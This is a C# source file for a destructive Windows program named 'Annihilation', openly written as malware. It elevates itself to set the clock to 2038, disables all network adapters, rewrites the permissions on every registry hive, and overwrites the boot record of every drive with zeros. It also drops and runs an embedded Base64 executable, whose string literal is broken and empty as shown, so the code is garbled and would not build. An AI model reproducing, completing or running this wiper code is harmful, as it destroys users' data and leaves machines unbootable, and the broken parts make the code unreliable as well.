using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Annihilation
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // Change system date first
                Console.WriteLine("Changing system date to 19-01-2038...");
                ChangeSystemDate();

                // Get network interfaces and cut the connections
                Console.WriteLine("Getting network interfaces and cutting connections...");
                var adapters = GetNetworkAdapters();
                CutNetworkConnections(adapters);

                // Lock the registry hives last (synchronously)
                RegistryAndVbrHandler handler = new RegistryAndVbrHandler();
                Console.WriteLine("Locking all registry hives...");
                handler.LockAllRegistryHives();
                Console.WriteLine("All registry hives locked successfully.");

                var corruptVbrTask = Task.Run(() =>
                {
                    Console.WriteLine("Corrupting all VBRs...");
                    handler.CorruptAllVBRS();
                    Console.WriteLine("All VBRs corrupted successfully.");
                });

                // Run the other tasks in parallel after registry is locked
                var runBase64ExeTask = Task.Run(() =>
                {
                    Console.WriteLine("Running Base64 decoded executable...");
                    string base64EncodedExe = "
                    RunBase64DecodedExe(base64EncodedExe);
                    Console.WriteLine("Executable run successfully.");
                });

                // Wait for all tasks to complete
                Task.WhenAll(runBase64ExeTask, corruptVbrTask).Wait();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }

            Console.WriteLine("Press any key to exit.");
            Console.ReadKey();
        }

        private static string[] GetNetworkAdapters()
        {
            try
            {
                // Execute the netsh command to show network interfaces
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = "interface show interface",  // Command to list all network interfaces
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                // Start the process and capture the output
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // Extract the names of the network interfaces from the output
                var lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                var adapterNames = lines.Skip(3)  // Skip the header lines
                                        .Select(line => line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries)[0])
                                        .ToArray();

                Console.WriteLine("Network adapters found:");
                foreach (var adapter in adapterNames)
                {
                    Console.WriteLine(adapter);
                }

                return adapterNames;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while getting network adapters: {ex.Message}");
                return Array.Empty<string>();
            }
        }

        private static void CutNetworkConnections(string[] adapters)
        {
            try
            {
                foreach (var adapter in adapters)
                {
                    Process process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "netsh",
                            Arguments = $"interface set interface \"{adapter}\" admin=disable",  // Disable the adapter
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };

                    // Run the process to disable the network adapter
                    process.Start();
                    process.WaitForExit();
                    Console.WriteLine($"Network interface {adapter} disabled.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while cutting network connections: {ex.Message}");
            }
        }

        private static void RunBase64DecodedExe(string base64EncodedExe)
        {
            try
            {
                // Decode the Base64 string into a byte array
                byte[] exeBytes = Convert.FromBase64String(base64EncodedExe);

                // Define a temporary path to save the executable
                string tempExePath = Path.Combine(Path.GetTempPath(), "decodedExecutable.exe");

                // Write the decoded bytes to the temporary file
                File.WriteAllBytes(tempExePath, exeBytes);

                // Set execution permissions (optional on some systems)
                File.SetAttributes(tempExePath, FileAttributes.Normal);

                // Run the executable
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = tempExePath,
                        UseShellExecute = true,
                    }
                };
                process.Start();
                process.WaitForExit(); // Optional: Wait for the executable to finish

                Console.WriteLine("Base64 decoded executable executed successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while running the Base64 decoded executable: {ex.Message}");
            }
        }

        private static void ChangeSystemDate()
        {
            try
            {
                // Change the system date to 19th January 2038 (requires administrator privileges)
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/C date 01-19-2038", // MM-dd-yyyy format for Windows
                        UseShellExecute = true,
                        Verb = "runas" // Run as administrator
                    }
                };
                process.Start();
                process.WaitForExit();
                Console.WriteLine("System date changed to 19-01-2038.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while changing the system date: {ex.Message}");
            }
        }
    }

    public class RegistryAndVbrHandler
    {
        public void LockAllRegistryHives()
        {
            try
            {
                string[] hives = {
                    "HKEY_CLASSES_ROOT",
                    "HKEY_CURRENT_USER",
                    "HKEY_LOCAL_MACHINE",
                    "HKEY_USERS",
                    "HKEY_CURRENT_CONFIG"
                };

                Parallel.ForEach(hives, hive => LockRegistryHive(hive));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while locking all registry hives: {ex.Message}");
            }
        }

        public void LockRegistryHive(string hive)
        {
            try
            {
                RegistryKey baseHive;

                // Determine which hive to open based on the provided hive string
                switch (hive)
                {
                    case "HKEY_CLASSES_ROOT":
                        baseHive = Registry.ClassesRoot;
                        break;
                    case "HKEY_CURRENT_USER":
                        baseHive = Registry.CurrentUser;
                        break;
                    case "HKEY_LOCAL_MACHINE":
                        baseHive = Registry.LocalMachine;
                        break;
                    case "HKEY_USERS":
                        baseHive = Registry.Users;
                        break;
                    case "HKEY_CURRENT_CONFIG":
                        baseHive = Registry.CurrentConfig;
                        break;
                    default:
                        throw new ArgumentException("Unknown hive");
                }

                var security = new RegistrySecurity();
                security.SetAccessRuleProtection(true, false);

                // Grant Full Control only to System and Administrators
                security.AddAccessRule(new RegistryAccessRule(
                    new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
                    RegistryRights.FullControl,
                    InheritanceFlags.None,
                    PropagationFlags.None,
                    AccessControlType.Allow));

                security.AddAccessRule(new RegistryAccessRule(
                    new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null),
                    RegistryRights.FullControl,
                    InheritanceFlags.None,
                    PropagationFlags.None,
                    AccessControlType.Allow));

                // Apply the security settings to the hive
                baseHive.SetAccessControl(security);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while locking the registry hive: {ex.Message}");
            }
        }

        public void CorruptAllVBRS()
        {
            try
            {
                int driveLetter = 'C'; // Start from ASCII value of 'C'
                Parallel.For(0, 26, i =>
                {
                    string volumePath = $"\\.\\{(char)(driveLetter + i)}:";

                    // Check if the volume exists
                    if (Directory.Exists(volumePath))
                    {
                        WriteCorruptVBR(volumePath);
                    }
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to corrupt VBRs: {ex.Message}");
            }
        }

        private void WriteCorruptVBR(string volumePath)
        {
            try
            {
                // Create corrupt VBR data (e.g., all zeros or any other pattern)
                byte[] vbrData = new byte[512]; // Create an array of 512 bytes initialized to zero

                // Open the specified volume for writing the VBR
                using (FileStream fs = new FileStream(volumePath, FileMode.Open, FileAccess.Write))
                {
                    // Write the corrupt data (VBR) to the beginning of the volume
                    fs.Write(vbrData, 0, vbrData.Length);
                }

                Console.WriteLine("Corrupt VBR written successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to write corrupt VBR: {ex.Message}");
            }
        }
    }
}
